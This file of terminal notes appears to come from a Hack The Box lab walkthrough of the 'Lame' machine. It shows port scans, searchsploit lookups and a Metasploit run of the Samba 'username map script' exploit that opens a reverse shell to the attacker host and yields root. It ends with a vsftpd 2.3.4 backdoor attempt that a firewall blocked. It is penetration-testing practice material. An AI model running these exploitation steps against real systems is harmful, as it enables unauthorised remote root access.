@@ -1,0 +1,192 @@
+kali@kali:~$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.3
+[sudo] password for kali:                                               
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 17:47 EDT         
+Warning: 10.10.10.3 giving up on port because retransmission cap hit (0).                                                                       
+Warning: 10.10.10.3 giving up on port because retransmission cap hit (0).                                                                       
+Nmap scan report for 10.10.10.3                                         
+Host is up (0.16s latency).                                             
+Not shown: 997 open|filtered ports, 996 filtered ports                  
+PORT    STATE  SERVICE                                                  
+21/tcp  open   ftp                                                      
+22/tcp  open   ssh                                                      
+139/tcp open   netbios-ssn                                              
+445/tcp open   microsoft-ds                                             
+22/udp  closed ssh                                                      
+139/udp closed netbios-ssn                                              
+445/udp closed microsoft-ds  
+
+
+
+kali@kali:~$ nmap -sC -sV -Pn 10.10.10.3
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 18:00 EDT
+Nmap scan report for 10.10.10.3
+Host is up (0.16s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.5
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -3d00h53m59s, deviation: 2h49m43s, median: -3d02h54m00s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-07-02T15:07:18-04:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+
+
+kali@kali:~$ searchsploit samba 3.0.20
+---------------------------------------------------------------------------------------------------- --------------------
+ Exploit Title                                                                                      |  Path
+---------------------------------------------------------------------------------------------------- --------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                              | multiple/remote/100
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                    | unix/remote/16320.r
+Samba < 3.0.20 - Remote Heap Overflow                                                               | linux/remote/7701.t
+Samba < 3.0.20 - Remote Heap Overflow                                                               | linux/remote/7701.t
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                       | linux_x86/dos/36741
+---------------------------------------------------------------------------------------------------- --------------------
+Shellcodes: No Results
+
+
+
+kali@kali:~$ msfconsole 
+msf5 > search samba 3.0.20
+
+Matching Modules
+================
+
+   #   Name                                                   Disclosure Date  Rank       Check  Description
+   -   ----                                                   ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
+   1   auxiliary/admin/smb/samba_symlink_traversal                             normal     No     Samba Symlink Directory Traversal
+   2   auxiliary/dos/samba/lsa_addprivs_heap                                   normal     No     Samba lsa_io_privilege_set Heap Overflow
+   3   auxiliary/dos/samba/lsa_transnames_heap                                 normal     No     Samba lsa_io_trans_names Heap Overflow
+   4   auxiliary/dos/samba/read_nttrans_ea_list                                normal     No     Samba read_nttrans_ea_list Integer Overflow
+   5   auxiliary/scanner/rsync/modules_list                                    normal     No     List Rsync Modules
+   6   auxiliary/scanner/smb/smb_uninit_cred                                   normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   7   exploit/freebsd/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
+   8   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   9   exploit/linux/samba/is_known_pipename                  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   10  exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   11  exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   12  exploit/linux/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
+   13  exploit/multi/samba/nttrans                            2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   14  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
+   15  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   16  exploit/osx/samba/trans2open                           2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
+   17  exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   18  exploit/solaris/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
+   19  exploit/unix/http/quest_kace_systems_management_rce    2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   20  exploit/unix/misc/distcc_exec                          2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   21  exploit/unix/webapp/citrix_access_gateway_exec         2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   22  exploit/windows/fileformat/ms14_060_sandworm           2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   23  exploit/windows/http/sambar6_search_results            2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
+   24  exploit/windows/license/calicclnt_getconfig            2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
+   25  exploit/windows/smb/group_policy_startup               2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   26  post/linux/gather/enum_configs                                          normal     No     Linux Gather Configurations
+
+
+msf5 > use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3 
+rhost => 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 10.10.14.5:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo RpWuo3ucHq4QLJif;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "RpWuo3ucHq4QLJif\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.5:4444 -> 10.10.10.3:33530) at 2020-07-05 18:11:01 -0400
+
+
+ls -al
+total 97
+drwxr-xr-x  21 root root  4096 May 20  2012 .
+drwxr-xr-x  21 root root  4096 May 20  2012 ..
+drwxr-xr-x   2 root root  4096 May 13  2012 bin
+drwxr-xr-x   4 root root  1024 May 13  2012 boot
+lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
+drwxr-xr-x  13 root root 13560 Jul  2 14:52 dev
+drwxr-xr-x  95 root root  4096 Jul  2 14:52 etc
+drwxr-xr-x   6 root root  4096 Mar 14  2017 home
+drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
+lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
+drwxr-xr-x  13 root root  4096 May 13  2012 lib
+drwx------   2 root root 16384 Mar 16  2010 lost+found
+drwxr-xr-x   4 root root  4096 Mar 16  2010 media
+drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
+-rw-------   1 root root 14473 Jul  2 14:53 nohup.out
+drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
+dr-xr-xr-x 109 root root     0 Jul  2 14:52 proc
+drwxr-xr-x  13 root root  4096 Jul  2 14:53 root
+drwxr-xr-x   2 root root  4096 May 13  2012 sbin
+drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
+drwxr-xr-x  12 root root     0 Jul  2 14:52 sys
+drwxrwxrwt   4 root root  4096 Jul  2 15:16 tmp
+drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
+drwxr-xr-x  15 root root  4096 May 20  2012 var
+lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
+pwd
+/
+whoami
+root
+
+
+the ftp should also work but there's IPTables in place
+kali@kali:~$ searchsploit vsftpd 2.3.4
+--------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                         |  Path
+--------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                 | unix/remote/17491.rb
+--------------------------------------------------------------------------------------- ---------------------------------
+
+
+the exploit will open port 6200, it works, and opened that port, but iptables stop it 
+
+kali@kali:/usr/share/exploitdb/exploits/unix/remote$ nmap -p 6200 -Pn 10.10.10.3
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 18:25 EDT
+Nmap scan report for 10.10.10.3
+Host is up.
+
+PORT     STATE    SERVICE
+6200/tcp filtered lm-x
+
+
+
+
+
+
